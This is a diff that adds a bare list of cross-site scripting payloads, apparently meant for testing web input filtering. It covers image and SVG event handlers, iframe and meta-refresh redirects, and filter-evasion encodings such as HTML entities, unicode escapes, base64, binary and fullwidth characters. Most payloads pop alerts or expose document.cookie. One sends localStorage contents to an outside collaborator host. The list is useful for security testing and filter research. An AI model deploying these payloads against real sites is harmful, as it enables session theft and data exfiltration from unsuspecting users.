@@ -1,0 +1,58 @@
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+#"><img src=/ onerror=alert(document.cookie)>
+<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">
+'"><img src=x onerror=alert(document.cookie)>
+<IMG SRC=# onmouseover="alert('xxs')">
+">%20<iframe src=evil.source onload=alert(document.domain)>%20</iframe>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<iframe src="vbscript:msgbox(1)"></iframe> (IE)
+</h4><script>alert(document.cookie)</script>
+&#x3c;IMG SRC&#x3d;# onmouseover&#x3d;&#x22;alert('xxs')&#x22;&#x3e;
+‘);alert(1);(‘
+\";alert('XSS');//
+&#39;&#88;&#83;&#83;&#39;&#41;>
+<video/poster/onerror=alert()>
+alert`23`
+
+"-prompt(8)-"
+javascript:{ alert`0` }
+%2sscript%2ualert()%2s/script%2u
+asd"`> onpointerenter=x=prompt,x`XSS`
+<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>
+💋img src=x onerror=alert(document.domain)//💛
+#"><img src=/ onerror=alert(document.cookie)>
+
+<img src=x onerror=this.src='http://1xxya2udyyfwkz4cvxwk66dtft6zwnl.oastify.com/?'+localStorage.getItem('d');> 
+
+<iframe/src \/\/onload = prompt(1)
+
+
+
+<<scr\aaa/src=></script><script>alert("spider")</script>
+
+<audio src='https://cutt.ly/7BA5ICq'onloadstart=alert(1) controls>
+<select onchange=alert(1)><option>1<option>2
+
+confirm
+
+
+U+003CscriptU+003Ealert
+
+
+<svg/onload=alert(1)>
+＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（＂ｓｐｉｄｅｒ＂）＜／ｓｃｒｉｐｔ＞
+0011110001110011011000110111001001101001011100000111010000111110011000010110110001100101011100100111010000101000001000100111001101110000011010010110010001100101011100100010001000101001001111000010111101110011011000110111001001101001011100000111010000111110
+\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0073\u0070\u0069\u0064\u0065\u0072\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e
+PHNjcmlwdD5hbGVydCgic3BpZGVyIik8L3NjcmlwdD4=
+<̳s̳c̳r̳i̳p̳t̳>̳a̳l̳e̳r̳t̳(̳"̳s̳p̳i̳d̳e̳r̳"̳)̳<̳/̳s̳c̳r̳i̳p̳t̳>̳
+
+<͓̽s͓̽c͓̽r͓̽i͓̽p͓̽t͓̽>͓̽a͓̽l͓̽e͓̽r͓̽t͓̽(͓̽"͓̽s͓̽p͓̽i͓̽d͓̽e͓̽r͓̽"͓̽)͓̽<͓̽/͓̽s͓̽c͓̽r͓̽i͓̽p͓̽t͓̽>͓̽
+
+
+<BODY&#x20;BACKGROUND="javascript:alert('XSS')">
+
+
+<meta http-equiv=&#x22;refresh&#x22; content=&#x22;0; url=//portswigger-labs.net&#x22;>
+
+
+
